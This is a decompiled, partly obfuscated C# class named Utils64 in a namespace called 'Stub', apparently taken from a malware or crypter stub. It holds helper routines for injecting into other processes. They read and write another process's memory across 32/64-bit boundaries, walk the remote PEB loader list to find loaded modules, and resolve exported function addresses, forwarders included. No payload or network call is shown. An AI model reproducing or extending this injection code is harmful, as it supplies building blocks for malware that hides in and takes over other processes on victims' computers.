using System;
using System.Linq;
using System.Runtime.InteropServices;
using dg3ypDAonQcOidMs0w;
using rE4lpnT863QnijKQK5;

namespace Stub
{
	// Token: 0x020000D5 RID: 213
	internal sealed class Utils64
	{
		// Token: 0x06000345 RID: 837 RVA: 0x0001EE68 File Offset: 0x0001D068
		public static string GetProcessDesktopName64(IntPtr hProcess)
		{
			string text;
			if (hProcess == IntPtr.Zero)
			{
				text = null;
			}
			else
			{
				UIntPtr zero = UIntPtr.Zero;
				ulong num3;
				if (Environment.Is64BitProcess)
				{
					InternalStructs.PROCESS_BASIC_INFORMATION process_BASIC_INFORMATION = default(InternalStructs.PROCESS_BASIC_INFORMATION);
					uint num = (uint)Marshal.SizeOf<InternalStructs.PROCESS_BASIC_INFORMATION>(process_BASIC_INFORMATION);
					uint num2 = 0U;
					if (NativeMethods.NtQueryInformationProcess_1(hProcess, InternalStructs.PROCESSINFOCLASS.ProcessBasicInformation, ref process_BASIC_INFORMATION, num, ref num2) != 0 || process_BASIC_INFORMATION.PebBaseAddress == IntPtr.Zero)
					{
						return null;
					}
					num3 = (ulong)(long)process_BASIC_INFORMATION.PebBaseAddress;
				}
				else
				{
					InternalStructs64.PROCESS_BASIC_INFORMATION64 process_BASIC_INFORMATION2 = default(InternalStructs64.PROCESS_BASIC_INFORMATION64);
					uint num4 = (uint)Marshal.SizeOf<InternalStructs64.PROCESS_BASIC_INFORMATION64>(process_BASIC_INFORMATION2);
					uint num5 = 0U;
					if (SpecialNativeMethods.NtWow64QueryInformationProcess64(hProcess, InternalStructs.PROCESSINFOCLASS.ProcessBasicInformation, ref process_BASIC_INFORMATION2, num4, ref num5) != 0 || process_BASIC_INFORMATION2.PebBaseAddress == 0UL)
					{
						return null;
					}
					num3 = process_BASIC_INFORMATION2.PebBaseAddress;
				}
				if (num3 == 0UL)
				{
					text = null;
				}
				else
				{
					ulong rtl = InternalStructs64.GetRTL64(num3);
					int num6 = Marshal.SizeOf(typeof(InternalStructs.ULONGRESULT));
					IntPtr intPtr = Marshal.AllocHGlobal(num6);
					if (!Utils64.ReadProperBitnessProcessMemory(hProcess, rtl, intPtr, (UIntPtr)((ulong)((long)num6)), ref zero))
					{
						Marshal.FreeHGlobal(intPtr);
						text = null;
					}
					else
					{
						ulong value = Marshal.PtrToStructure<InternalStructs.ULONGRESULT>(intPtr).Value;
						Marshal.FreeHGlobal(intPtr);
						int num7 = Marshal.SizeOf<InternalStructs64.RTL_USER_PROCESS_PARAMETERS64>();
						IntPtr intPtr2 = Marshal.AllocHGlobal(num7);
						if (!Utils64.ReadProperBitnessProcessMemory(hProcess, value, intPtr2, (UIntPtr)((ulong)((long)num7)), ref zero))
						{
							Marshal.FreeHGlobal(intPtr2);
							text = null;
						}
						else
						{
							InternalStructs64.RTL_USER_PROCESS_PARAMETERS64 rtl_USER_PROCESS_PARAMETERS = Marshal.PtrToStructure<InternalStructs64.RTL_USER_PROCESS_PARAMETERS64>(intPtr2);
							Marshal.FreeHGlobal(intPtr2);
							IntPtr intPtr3 = Marshal.AllocHGlobal((int)rtl_USER_PROCESS_PARAMETERS.DesktopInfo.Length);
							if (!Utils64.ReadProperBitnessProcessMemory(hProcess, rtl_USER_PROCESS_PARAMETERS.DesktopInfo.Buffer, intPtr3, (UIntPtr)((uint)rtl_USER_PROCESS_PARAMETERS.DesktopInfo.Length), ref zero))
							{
								Marshal.FreeHGlobal(intPtr3);
								text = null;
							}
							else
							{
								string text2 = Marshal.PtrToStringUni(intPtr3, (int)(rtl_USER_PROCESS_PARAMETERS.DesktopInfo.Length / 2));
								Marshal.FreeHGlobal(intPtr3);
								text = text2;
							}
						}
					}
				}
			}
			return text;
		}

		// Token: 0x06000346 RID: 838 RVA: 0x0001F060 File Offset: 0x0001D260
		public static bool WriteBytesToProcess64(IntPtr handle, ulong address, byte[] data)
		{
			IntPtr intPtr = Marshal.AllocHGlobal(data.Length);
			Marshal.Copy(data, 0, intPtr, data.Length);
			IntPtr intPtr2;
			bool flag;
			if (Environment.Is64BitProcess)
			{
				flag = NativeMethods.WriteProcessMemory(handle, (IntPtr)((long)address), intPtr, (IntPtr)data.Length, out intPtr2);
			}
			else
			{
				ulong num = 0UL;
				int num2 = SpecialNativeMethods.NtWow64WriteVirtualMemory64(handle, address, intPtr, (ulong)((long)data.Length), ref num);
				if (!(flag = num2 == 0))
				{
					NativeMethods.SetLastError((uint)num2);
				}
				intPtr2 = (IntPtr)((long)num);
			}
			Marshal.FreeHGlobal(intPtr);
			return flag && intPtr2 == (IntPtr)data.Length;
		}

		// Token: 0x06000347 RID: 839 RVA: 0x0001F0F4 File Offset: 0x0001D2F4
		private static bool ReadProperBitnessProcessMemory(IntPtr hProcess, ulong lpBaseAddress, IntPtr lpBuffer, UIntPtr dwSize, ref UIntPtr lpNumberOfBytesRead)
		{
			bool flag;
			if (Environment.Is64BitProcess)
			{
				flag = NativeMethods.ReadProcessMemory(hProcess, (IntPtr)((long)lpBaseAddress), lpBuffer, dwSize, ref lpNumberOfBytesRead);
			}
			else
			{
				ulong num = 0UL;
				int num2 = SpecialNativeMethods.NtWow64ReadVirtualMemory64(hProcess, lpBaseAddress, lpBuffer, (ulong)dwSize, ref num);
				bool flag2;
				if (!(flag2 = num2 == 0))
				{
					NativeMethods.SetLastError((uint)num2);
				}
				lpNumberOfBytesRead = (UIntPtr)num;
				flag = flag2;
			}
			return flag;
		}

		// Token: 0x06000348 RID: 840 RVA: 0x0001F158 File Offset: 0x0001D358
		public static ulong GetRemoteModuleHandle64Bit(IntPtr hProcess, string DllBaseName, int max_flink_count = 600)
		{
			if (hProcess == IntPtr.Zero)
			{
				throw new Exception("The supplied hProcess is Null!");
			}
			UIntPtr zero = UIntPtr.Zero;
			ulong num3;
			if (Environment.Is64BitProcess)
			{
				InternalStructs.PROCESS_BASIC_INFORMATION process_BASIC_INFORMATION = default(InternalStructs.PROCESS_BASIC_INFORMATION);
				uint num = (uint)Marshal.SizeOf<InternalStructs.PROCESS_BASIC_INFORMATION>(process_BASIC_INFORMATION);
				uint num2 = 0U;
				if (NativeMethods.NtQueryInformationProcess_1(hProcess, InternalStructs.PROCESSINFOCLASS.ProcessBasicInformation, ref process_BASIC_INFORMATION, num, ref num2) != 0 || process_BASIC_INFORMATION.PebBaseAddress == IntPtr.Zero)
				{
					throw new Exception("couldnt read PBI from process!");
				}
				num3 = (ulong)(long)process_BASIC_INFORMATION.PebBaseAddress;
			}
			else
			{
				InternalStructs64.PROCESS_BASIC_INFORMATION64 process_BASIC_INFORMATION2 = default(InternalStructs64.PROCESS_BASIC_INFORMATION64);
				uint num4 = (uint)Marshal.SizeOf<InternalStructs64.PROCESS_BASIC_INFORMATION64>(process_BASIC_INFORMATION2);
				uint num5 = 0U;
				if (SpecialNativeMethods.NtWow64QueryInformationProcess64(hProcess, InternalStructs.PROCESSINFOCLASS.ProcessBasicInformation, ref process_BASIC_INFORMATION2, num4, ref num5) != 0 || process_BASIC_INFORMATION2.PebBaseAddress == 0UL)
				{
					throw new Exception("couldnt read PBI from process!");
				}
				num3 = process_BASIC_INFORMATION2.PebBaseAddress;
			}
			ulong num6;
			if (num3 == 0UL)
			{
				num6 = 0UL;
			}
			else
			{
				ulong ldr = InternalStructs64.GetLdr64(num3);
				int num7 = Marshal.SizeOf(typeof(InternalStructs.ULONGRESULT));
				IntPtr intPtr = Marshal.AllocHGlobal(num7);
				if (!Utils64.ReadProperBitnessProcessMemory(hProcess, ldr, intPtr, (UIntPtr)((ulong)((long)num7)), ref zero))
				{
					Marshal.FreeHGlobal(intPtr);
					throw new Exception("couldnt read pLdrData. ERR CODE: " + Marshal.GetLastWin32Error().ToString());
				}
				ulong value = Marshal.PtrToStructure<InternalStructs.ULONGRESULT>(intPtr).Value;
				Marshal.FreeHGlobal(intPtr);
				if (value == 0UL)
				{
					num6 = 0UL;
				}
				else
				{
					if (!Utils64.ReadProperBitnessProcessMemory(hProcess, ldr, intPtr, (UIntPtr)((ulong)((long)num7)), ref zero))
					{
						Marshal.FreeHGlobal(intPtr);
						throw new Exception("couldnt read pLdrData. ERR CODE: " + Marshal.GetLastWin32Error().ToString());
					}
					int num8 = Marshal.SizeOf(typeof(InternalStructs64.PEB_LDR_DATA64));
					IntPtr intPtr2 = Marshal.AllocHGlobal(num8);
					if (!Utils64.ReadProperBitnessProcessMemory(hProcess, value, intPtr2, (UIntPtr)((ulong)((long)num8)), ref zero))
					{
						Marshal.FreeHGlobal(intPtr2);
						throw new Exception("couldnt read ldr64. ERR CODE: " + Marshal.GetLastWin32Error().ToString());
					}
					InternalStructs64.PEB_LDR_DATA64 peb_LDR_DATA = Marshal.PtrToStructure<InternalStructs64.PEB_LDR_DATA64>(intPtr2);
					Marshal.FreeHGlobal(intPtr2);
					ulong num9 = peb_LDR_DATA.InLoadOrderModuleList.Flink;
					ulong num10 = (ulong)((uint)ldr + (uint)(int)Marshal.OffsetOf(typeof(InternalStructs64.PEB_LDR_DATA64), "InLoadOrderModuleList"));
					int num11 = Marshal.SizeOf(typeof(InternalStructs64.LDR_DATA_TABLE_ENTRY64_SNAP));
					IntPtr intPtr3 = Marshal.AllocHGlobal(num11);
					ulong num12 = 0UL;
					int num13 = 0;
					while (num9 != num10 && num13 < max_flink_count)
					{
						num13++;
						if (!Utils64.ReadProperBitnessProcessMemory(hProcess, num9, intPtr3, (UIntPtr)((ulong)((long)num11)), ref zero))
						{
							break;
						}
						InternalStructs64.LDR_DATA_TABLE_ENTRY64_SNAP ldr_DATA_TABLE_ENTRY64_SNAP = Marshal.PtrToStructure<InternalStructs64.LDR_DATA_TABLE_ENTRY64_SNAP>(intPtr3);
						if (DllBaseName == null)
						{
							num12 = ldr_DATA_TABLE_ENTRY64_SNAP.DllBase;
							break;
						}
						num9 = ldr_DATA_TABLE_ENTRY64_SNAP.InLoadOrderLinks.Flink;
						if ((int)(ldr_DATA_TABLE_ENTRY64_SNAP.BaseDllName.Length / 2) == DllBaseName.Length)
						{
							IntPtr intPtr4 = Marshal.AllocHGlobal((int)ldr_DATA_TABLE_ENTRY64_SNAP.BaseDllName.Length);
							if (!Utils64.ReadProperBitnessProcessMemory(hProcess, ldr_DATA_TABLE_ENTRY64_SNAP.BaseDllName.Buffer, intPtr4, (UIntPtr)((uint)ldr_DATA_TABLE_ENTRY64_SNAP.BaseDllName.Length), ref zero))
							{
								Marshal.FreeHGlobal(intPtr4);
								break;
							}
							string text = Marshal.PtrToStringUni(intPtr4, (int)(ldr_DATA_TABLE_ENTRY64_SNAP.BaseDllName.Length / 2));
							Marshal.FreeHGlobal(intPtr4);
							if (text.ToLower() == DllBaseName.ToLower())
							{
								num12 = ldr_DATA_TABLE_ENTRY64_SNAP.DllBase;
								break;
							}
						}
					}
					Marshal.FreeHGlobal(intPtr3);
					num6 = num12;
				}
			}
			return num6;
		}

		// Token: 0x06000349 RID: 841 RVA: 0x0001F4F4 File Offset: 0x0001D6F4
		private static string ReadRemoteAnsiString64(IntPtr hProcess, ulong lpAddress)
		{
			string text = "";
			UIntPtr zero = UIntPtr.Zero;
			IntPtr intPtr = Marshal.AllocHGlobal(1);
			while (Utils64.ReadProperBitnessProcessMemory(hProcess, lpAddress, intPtr, (UIntPtr)1UL, ref zero))
			{
				byte b = Marshal.ReadByte(intPtr);
				if (b == 0)
				{
					return text;
				}
				string text2 = text;
				char c = (char)b;
				text = text2 + c.ToString();
				lpAddress += 1UL;
			}
			Marshal.FreeHGlobal(intPtr);
			throw new Exception("couldnt read AnsiString. ERR CODE: " + Marshal.GetLastWin32Error().ToString());
		}

		// Token: 0x0600034A RID: 842 RVA: 0x0001F588 File Offset: 0x0001D788
		public static ulong GetNtHeader64Addr(IntPtr hProcess, ulong hModule)
		{
			int num = Marshal.SizeOf(typeof(InternalStructs.IMAGE_DOS_HEADER));
			IntPtr intPtr = Marshal.AllocHGlobal(num);
			UIntPtr zero = UIntPtr.Zero;
			if (!Utils64.ReadProperBitnessProcessMemory(hProcess, hModule, intPtr, (UIntPtr)((ulong)((long)num)), ref zero))
			{
				Marshal.FreeHGlobal(intPtr);
				throw new Exception("couldnt read DosHeader. ERR CODE: " + Marshal.GetLastWin32Error().ToString());
			}
			InternalStructs.IMAGE_DOS_HEADER image_DOS_HEADER = Marshal.PtrToStructure<InternalStructs.IMAGE_DOS_HEADER>(intPtr);
			Marshal.FreeHGlobal(intPtr);
			return hModule + (ulong)image_DOS_HEADER.e_lfanew;
		}

		// Token: 0x0600034B RID: 843 RVA: 0x0001F608 File Offset: 0x0001D808
		public static InternalStructs64.IMAGE_NT_HEADERS64 GetNtHeader64(IntPtr hProcess, ulong hModule)
		{
			UIntPtr zero = UIntPtr.Zero;
			int num = Marshal.SizeOf(typeof(InternalStructs64.IMAGE_NT_HEADERS64));
			IntPtr intPtr = Marshal.AllocHGlobal(num);
			if (!Utils64.ReadProperBitnessProcessMemory(hProcess, Utils64.GetNtHeader64Addr(hProcess, hModule), intPtr, (UIntPtr)((ulong)((long)num)), ref zero))
			{
				Marshal.FreeHGlobal(intPtr);
				throw new Exception("couldnt read NTHeader. ERR CODE: " + Marshal.GetLastWin32Error().ToString());
			}
			InternalStructs64.IMAGE_NT_HEADERS64 image_NT_HEADERS = Marshal.PtrToStructure<InternalStructs64.IMAGE_NT_HEADERS64>(intPtr);
			Marshal.FreeHGlobal(intPtr);
			return image_NT_HEADERS;
		}

		// Token: 0x0600034C RID: 844 RVA: 0x0001F684 File Offset: 0x0001D884
		public static ulong GetRemoteProcAddress64Bit(IntPtr hProcess, ulong hModule, string FunctionName)
		{
			if (hModule == 0UL)
			{
				throw new Exception("couldnt read hModule is null or 0.");
			}
			UIntPtr zero = UIntPtr.Zero;
			InternalStructs64.IMAGE_NT_HEADERS64 ntHeader = Utils64.GetNtHeader64(hProcess, hModule);
			InternalStructs.IMAGE_DATA_DIRECTORY image_DATA_DIRECTORY = ntHeader.OptionalHeader.DataDirectory[0];
			ulong num;
			if (image_DATA_DIRECTORY.Size == 0U || image_DATA_DIRECTORY.VirtualAddress == 0U)
			{
				num = 0UL;
			}
			else
			{
				int num2 = Marshal.SizeOf(typeof(InternalStructs.IMAGE_EXPORT_DIRECTORY));
				IntPtr intPtr = Marshal.AllocHGlobal(num2);
				if (!Utils64.ReadProperBitnessProcessMemory(hProcess, hModule + (ulong)image_DATA_DIRECTORY.VirtualAddress, intPtr, (UIntPtr)((ulong)((long)num2)), ref zero))
				{
					Marshal.FreeHGlobal(intPtr);
					throw new Exception("couldnt read IMAGE EXPORT DIRECTORY. ERR CODE: " + Marshal.GetLastWin32Error().ToString());
				}
				InternalStructs.IMAGE_EXPORT_DIRECTORY image_EXPORT_DIRECTORY = Marshal.PtrToStructure<InternalStructs.IMAGE_EXPORT_DIRECTORY>(intPtr);
				Marshal.FreeHGlobal(intPtr);
				if (image_EXPORT_DIRECTORY.NumberOfNames == 0U)
				{
					num = 0UL;
				}
				else
				{
					int num3 = (int)(image_EXPORT_DIRECTORY.NumberOfFunctions * (uint)Marshal.SizeOf(typeof(int)));
					IntPtr intPtr2 = Marshal.AllocHGlobal(num3);
					if (!Utils64.ReadProperBitnessProcessMemory(hProcess, hModule + (ulong)image_EXPORT_DIRECTORY.AddressOfFunctions, intPtr2, (UIntPtr)((ulong)((long)num3)), ref zero))
					{
						Marshal.FreeHGlobal(intPtr2);
						throw new Exception("couldnt read RVA table. ERR CODE: " + Marshal.GetLastWin32Error().ToString());
					}
					uint[] array = new uint[image_EXPORT_DIRECTORY.NumberOfFunctions];
					for (int i = 0; i < (int)image_EXPORT_DIRECTORY.NumberOfFunctions; i++)
					{
						array[i] = Marshal.PtrToStructure<InternalStructs.UINTRESULT>(intPtr2 + i * 4).Value;
					}
					Marshal.FreeHGlobal(intPtr2);
					int num4 = (int)(image_EXPORT_DIRECTORY.NumberOfFunctions * (uint)Marshal.SizeOf(typeof(short)));
					IntPtr intPtr3 = Marshal.AllocHGlobal(num4);
					if (!Utils64.ReadProperBitnessProcessMemory(hProcess, hModule + (ulong)image_EXPORT_DIRECTORY.AddressOfNameOrdinals, intPtr3, (UIntPtr)((ulong)((long)num4)), ref zero))
					{
						Marshal.FreeHGlobal(intPtr3);
						throw new Exception("couldnt read ORD table. ERR CODE: " + Marshal.GetLastWin32Error().ToString());
					}
					ushort[] array2 = new ushort[image_EXPORT_DIRECTORY.NumberOfFunctions];
					for (int j = 0; j < (int)image_EXPORT_DIRECTORY.NumberOfFunctions; j++)
					{
						array2[j] = Marshal.PtrToStructure<InternalStructs.USHORTRESULT>(intPtr3 + j * 2).Value;
					}
					Marshal.FreeHGlobal(intPtr3);
					int num5 = (int)(image_EXPORT_DIRECTORY.NumberOfNames * (uint)Marshal.SizeOf(typeof(int)));
					IntPtr intPtr4 = Marshal.AllocHGlobal(num5);
					if (!Utils64.ReadProperBitnessProcessMemory(hProcess, hModule + (ulong)image_EXPORT_DIRECTORY.AddressOfNames, intPtr4, (UIntPtr)((ulong)((long)num5)), ref zero))
					{
						Marshal.FreeHGlobal(intPtr4);
						throw new Exception("couldnt read NAME table. ERR CODE: " + Marshal.GetLastWin32Error().ToString());
					}
					uint[] array3 = new uint[image_EXPORT_DIRECTORY.NumberOfNames];
					for (int k = 0; k < (int)image_EXPORT_DIRECTORY.NumberOfNames; k++)
					{
						array3[k] = Marshal.PtrToStructure<InternalStructs.UINTRESULT>(intPtr4 + k * 4).Value;
					}
					Marshal.FreeHGlobal(intPtr4);
					int num6 = FunctionName.Length + 1;
					IntPtr intPtr5 = Marshal.AllocHGlobal(num6);
					ulong num7 = 0UL;
					for (int l = 0; l < array3.Length; l++)
					{
						if (!Utils64.ReadProperBitnessProcessMemory(hProcess, hModule + (ulong)array3[l], intPtr5, (UIntPtr)((ulong)((long)num6)), ref zero))
						{
							Marshal.FreeHGlobal(intPtr5);
							throw new Exception("couldnt read name buffer. ERR CODE: " + Marshal.GetLastWin32Error().ToString());
						}
						byte b = Marshal.ReadByte(intPtr5 + num6 - 2);
						if (Marshal.ReadByte(intPtr5 + num6 - 1) == 0 && b > 0)
						{
							uint num8 = array[(int)array2[l]];
							string text = Marshal.PtrToStringAnsi(intPtr5);
							if (text == FunctionName)
							{
								if (num8 < image_DATA_DIRECTORY.VirtualAddress || num8 >= image_DATA_DIRECTORY.VirtualAddress + image_DATA_DIRECTORY.Size)
								{
									num7 = hModule + (ulong)num8;
									IL_04CC:
									Marshal.FreeHGlobal(intPtr5);
									return num7;
								}
								string text2 = Utils64.ReadRemoteAnsiString64(hProcess, hModule + (ulong)num8);
								if (!text2.Contains("."))
								{
									Marshal.FreeHGlobal(intPtr5);
									throw new Exception("Couldnt the Forwarder info!");
								}
								string[] array4 = text2.Split(new char[] { '.' });
								string text3 = string.Join(".", array4.Take(array4.Length - 1).ToArray<string>()) + ".dll";
								string text4 = array4[array4.Length - 1];
								if (text4.Contains("#"))
								{
									Marshal.FreeHGlobal(intPtr5);
									throw new Exception("Ordinal forwarder function is not supported at this time!");
								}
								ulong remoteModuleHandle64Bit = Utils64.GetRemoteModuleHandle64Bit(hProcess, text3, 600);
								if (remoteModuleHandle64Bit == 0UL)
								{
									Marshal.FreeHGlobal(intPtr5);
									throw new Exception("Couldnt the Forwarder dll!");
								}
								return Utils64.GetRemoteProcAddress64Bit(hProcess, remoteModuleHandle64Bit, text4);
							}
						}
					}
					goto IL_04CC;
				}
			}
			return num;
		}

		// Token: 0x0600034D RID: 845 RVA: 0x000038B4 File Offset: 0x00001AB4
		public Utils64()
		{
			hHEYokUTtehNq5ji0d.QgAwAnEzW2N9V();
			base..ctor();
		}

		// Token: 0x0600034E RID: 846 RVA: 0x000038AD File Offset: 0x00001AAD
		static Utils64()
		{
			WP6RZJql8gZrNhVA9v.prXoP4RuYp();
		}
	}
}
